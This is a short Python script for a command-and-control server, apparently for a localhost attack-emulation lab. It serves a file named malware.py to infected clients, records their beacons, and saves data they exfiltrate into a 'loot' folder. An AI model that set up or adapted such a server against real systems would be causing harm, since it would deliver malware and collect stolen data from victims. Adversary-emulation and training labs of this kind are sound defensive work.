#!/usr/bin/env python3
"""
C2 Server (Command & Control) - Active Emulation
Listens on localhost:8888
"""

import http.server
import socketserver
import os
import logging
import sys

PORT = 8888
LOOT_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "loot")
if not os.path.exists(LOOT_DIR): os.mkdir(LOOT_DIR)

# Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - C2 - %(message)s')

class C2Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Serve payloads
        if self.path == "/payload":
            self.send_response(200)
            self.send_header("Content-type", "text/x-python")
            self.end_headers()

            payload_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "payloads", "malware.py")
            if os.path.exists(payload_path):
                with open(payload_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(b"# Payload missing")
            return

        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        if self.path == "/beacon":
            logging.info(f"Beacon received: {post_data.decode().strip()}")
            self.send_response(200)
            self.end_headers()

        elif self.path == "/exfil":
            logging.info(f"Exfiltration received! ({content_length} bytes)")
            loot_file = os.path.join(LOOT_DIR, f"loot_{int(time.time())}.dat")
            try:
                with open(loot_file, 'wb') as f: f.write(post_data)
            except: pass

            self.send_response(200)
            self.end_headers()

        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        return # Silence default access logs

if __name__ == "__main__":
    import time
    with socketserver.TCPServer(("127.0.0.1", PORT), C2Handler) as httpd:
        logging.info(f"C2 Server listening on port {PORT}...")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            httpd.server_close()
            logging.info("C2 Server stopped.")
